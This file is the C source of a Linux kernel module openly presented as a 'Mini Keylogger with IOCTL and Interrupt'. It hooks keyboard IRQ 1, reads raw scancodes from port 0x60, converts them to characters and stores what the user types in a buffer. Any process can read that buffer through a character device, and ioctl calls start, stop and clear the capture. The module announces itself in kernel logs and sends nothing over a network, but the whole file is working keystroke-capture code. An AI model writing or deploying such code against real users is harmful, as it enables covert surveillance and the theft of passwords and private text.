// smart_keylogger_driver.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/interrupt.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/ioctl.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/io.h>  // for inb()

#define DEVICE_NAME "keylogger"
#define BUF_LEN 1024
#define MAGIC 'k'
#define START_LOGGING _IO(MAGIC, 1)
#define STOP_LOGGING  _IO(MAGIC, 2)
#define CLEAR_LOG     _IO(MAGIC, 3)

static int major;
static struct class *keylog_class;

static char log_buffer[BUF_LEN];
static int log_pos = 0;
static int logging_enabled = 0;

// ASCII table for simple scancode to character conversion
static const char *keymap[] = {
    "[RESERVED]", "ESC", "1", "2", "3", "4", "5", "6",
    "7", "8", "9", "0", "-", "=", "BACKSPACE", "TAB",
    "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "LCTRL", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "`", "LSHIFT", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "RSHIFT", "*",
    "LALT", "SPACEBAR"
};

static irqreturn_t keyboard_irq_handler(int irq, void *dev_id) {
    unsigned char scancode = inb(0x60);
    if (logging_enabled && scancode < sizeof(keymap)/sizeof(char *)) {
        const char *key = keymap[scancode];
        if (strlen(key) == 1 && log_pos < BUF_LEN - 1) {
            log_buffer[log_pos++] = key[0];
            log_buffer[log_pos] = '\0';
        }
    }
    return IRQ_HANDLED;
}

static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case START_LOGGING:
            logging_enabled = 1;
            printk(KERN_INFO "Keylogger: Started logging\n");
            break;
        case STOP_LOGGING:
            logging_enabled = 0;
            printk(KERN_INFO "Keylogger: Stopped logging\n");
            break;
        case CLEAR_LOG:
            log_pos = 0;
            log_buffer[0] = '\0';
            printk(KERN_INFO "Keylogger: Cleared buffer\n");
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

static ssize_t dev_read(struct file *file, char __user *buf, size_t len, loff_t *offset) {
    if (*offset >= log_pos) return 0;
    if (len > log_pos - *offset) len = log_pos - *offset;
    if (copy_to_user(buf, log_buffer + *offset, len)) return -EFAULT;
    *offset += len;
    return len;
}

static int dev_open(struct inode *inode, struct file *file) {
    return 0;
}

static int dev_release(struct inode *inode, struct file *file) {
    return 0;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = dev_open,
    .read = dev_read,
    .release = dev_release,
    .unlocked_ioctl = dev_ioctl
};

static int __init keylog_init(void) {
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) return major;

    keylog_class = class_create(DEVICE_NAME);
    if (IS_ERR(keylog_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return PTR_ERR(keylog_class);
    }

    device_create(keylog_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (request_irq(1, keyboard_irq_handler, IRQF_SHARED, "keyboard_irq_handler", (void *)(keyboard_irq_handler))) {
        printk(KERN_ERR "Keylogger: Cannot register IRQ\n");
        class_destroy(keylog_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -EIO;
    }

    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

static void __exit keylog_exit(void) {
    free_irq(1, (void *)(keyboard_irq_handler));
    device_destroy(keylog_class, MKDEV(major, 0));
    class_destroy(keylog_class);
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylog_init);
module_exit(keylog_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Bharath");
MODULE_DESCRIPTION("Mini Keylogger with IOCTL and Interrupt");

